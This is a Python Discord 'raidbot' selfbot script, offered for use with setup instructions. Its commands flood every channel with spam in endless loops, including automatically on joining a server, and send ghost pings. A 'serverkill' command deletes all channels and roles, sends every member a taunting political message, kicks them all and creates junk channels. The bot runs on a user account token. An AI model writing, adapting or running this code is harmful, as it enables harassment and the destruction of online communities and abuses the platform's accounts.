import discord
from discord.ext import commands



#This selfbot was made by chaotic and the chaos gang.
#IMPORTANT NOTICE
#THE BOT WILL NOT RESPOND TO COMMANDS COMING FROM THE BOT ACCOUNT, YOU MUST USE ANOTHER ACCOUNT TO COMMAND IT


#Put your bot's prefix in the quotes. The prefix is used to signal to the bot that the following text is a command.

# For example, a help command with the prefix "$" would look like this.    $help

client = commands.Bot(command_prefix="$")

#put your spam message in the quotes. Images must be sent with a url.
message = ""

@client.event
async def on_ready():
  print("______DISCORD RAIDBOT______")
  print("Made by Chaotic")
  print(" ")
  print('You are logged in as {}.'.format(client.user.name))
  print("Commands are spam, gspam, mspam, spamall, serverkill and leave.")

#Allows the bot to spam all channels when it joins a server.
@client.event
async def on_guild_join(guild):
  while True:
    for channel in list(guild.text_channels):
            try:
                await channel.send(message)
            except:
                print (f"{channel.name} cant be messaged.")

#This command spams the channel the command is sent in.
@client.command()
async def spam(ctx):
  while True:
    await ctx.send(message)

#This command spams all channels in the server the command was sent in.
@client.command()
async def spamall(ctx):
  while True:
    for channel in list(ctx.guild.text_channels):
            try:
                await channel.send(message)
            except:
                print (f"{channel.name} cant be messaged.")


#This command nukes a server
#NOTICE: THIS COMMAND WILL ONLY WORK IF THE BOT HAS ADMINISTRATOR PERMISSIONS
@client.command(pass_context=True)
async def serverkill(ctx, amount=100):
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:         
                await user.send("Get rekt, liberals.")
                print (f"{user.name} has recived the message.")
            except:
                print (f"{user.name} has FAILED to recieve the message.")
        for user in list(ctx.guild.members):
            try:         
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
                guild = ctx.message.guild 
        for i in range(amount):
           await guild.create_text_channel("lol")
        print ("nuked server successfully!")


#This command makes your bot leave the guild.
@client.command()
async def leave(ctx):
  await ctx.guild.leave()

#spams a custom message
@client.command()
async def mspam(ctx, *, spam):
  while True:
   await ctx.send(spam)
   print (f"sending message {spam}")

#ghostpings
@client.command()
async def gspam(ctx):
  while True:
    await ctx.send(message, delete_after=0)

#Put your account's token in the quotation marks. If you do not know how to get your account's token, please watch this video.

#https://www.youtube.com/watch?v=tI1lzqzLQCs

client.run("", bot = False)